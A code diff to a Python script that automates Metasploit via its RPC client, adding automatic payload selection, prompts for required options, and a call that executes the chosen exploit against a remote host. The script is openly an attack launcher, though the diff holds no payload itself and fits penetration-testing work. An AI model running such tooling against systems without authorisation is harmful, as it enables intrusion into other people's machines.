@@ -3,6 +3,7 @@
 import subprocess
 import pprint
 import json
+import autopayload
 from pymetasploit3.msfrpc import MsfRpcClient
 import time
 from logs import LOG
@@ -172,17 +173,27 @@ print("\n")
 plds = exploit.targetpayloads()
 print("[~] Available payloads :")
 pprint.pprint(plds)
-
-pay_idx = int(input("Which payload do you want to use ? : "))
-payload = client.modules.use("payload", plds[pay_idx])
+print("[-1 for autochosing]")
+pay_idx = int(input("Which payload do you want to use ? :"))
+print("")
+if (pay_idx == -1):
+    tmp = autopayload.autochose(exploit.targetpayloads())
+    if (tmp == -1) : 
+        payload = client.modules.use("payload", plds[0])
+        print("No usual payload available, reflected to : " + plds[0])
+    else : 
+        payload = client.modules.use("payload", tmp)
+        print("Autopayload selected : " + tmp)
+else :
+    payload = client.modules.use("payload", plds[pay_idx])
 print("[V] Payload selected !")
 LOG("User selected payload",logfile,"log")
-print(payload.missing_required)
 print("\n")
+for i in payload.missing_required:
+    payload[i] = input(i + ": ")
 
-
-exploit["RHOSTS"] = input("Remote HOST : ")
-payload["LHOST"] = "192.168.1.86"
+for i in exploit.missing_required:
+    exploit[i] = input(i + ": ")
 
 print(exploit.execute(payload=payload))
 time.sleep(15)
